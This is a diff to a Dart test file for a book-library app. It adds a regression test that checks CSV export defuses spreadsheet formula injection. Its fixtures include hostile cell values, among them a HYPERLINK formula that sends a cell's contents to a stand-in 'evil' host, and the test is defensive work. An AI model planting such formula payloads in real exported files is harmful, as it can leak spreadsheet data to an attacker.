@@ -46,6 +46,9 @@ class _Books implements BookRepository {
   Future<Either<Failure, List<Book>>> search(String q) async => right(const []);
   @override
   Future<Either<Failure, int>> insertAll(List<Book> b) async => right(b.length);
+  @override
+  Future<Either<Failure, int>> replaceAll(List<Book> b) async =>
+      right(b.length);
 }
 
 class _Wishlist implements WishlistRepository {
@@ -169,6 +172,48 @@ void main() {
     final lines = utf8.decode(export.bytes).trim().split('\n');
     expect(lines.first, startsWith('title,author,isbn'));
     expect(lines.length, 3); // header + 2 books
+  });
+
+  // Regression for REVIEW_FINDINGS_2 S4 Major: a title/notes field planted
+  // via merge or import (e.g. `=HYPERLINK("http://evil/?"&A1)`) must not
+  // export as a bare formula cell that Excel/LibreOffice would execute.
+  test('CSV export neutralises formula-leading cells (OWASP)', () async {
+    const hostile = [
+      Book(title: '=1+1', addedDate: 1),
+      Book(title: '+cmd', addedDate: 2),
+      Book(title: '-2+3', addedDate: 3),
+      Book(title: '@SUM(A1)', addedDate: 4),
+      Book(title: '\ttabbed', addedDate: 5),
+      Book(
+        title: '=HYPERLINK("http://evil/?"&A1),x',
+        notes: 'safe',
+        addedDate: 6,
+      ),
+      Book(title: 'Normal title', addedDate: 7),
+    ];
+    final useCase = ExportLibraryUseCase(
+      bookRepo: _Books(hostile),
+      wishlistRepo: _Wishlist(const []),
+    );
+    final result = await useCase(
+      scope: ExportScope.libraryOnly,
+      format: ExportFormat.csv,
+    );
+    final export = result.getOrElse((f) => fail('failed: $f'));
+    final lines = utf8.decode(export.bytes).trim().split('\n');
+    // Every data row's first cell must start with the `'` text-marker, never
+    // a bare formula character.
+    for (var i = 1; i <= 5; i++) {
+      expect(
+        lines[i],
+        startsWith("'"),
+        reason: 'row $i must be quote-prefixed: ${lines[i]}',
+      );
+    }
+    // The formula-with-comma case keeps the marker INSIDE the RFC4180 quotes.
+    expect(lines[6], startsWith('"\'=HYPERLINK('));
+    // Untouched: a normal title exports verbatim.
+    expect(lines[7], startsWith('Normal title,'));
   });
 
   test('PDF export produces a valid PDF of the library list', () async {
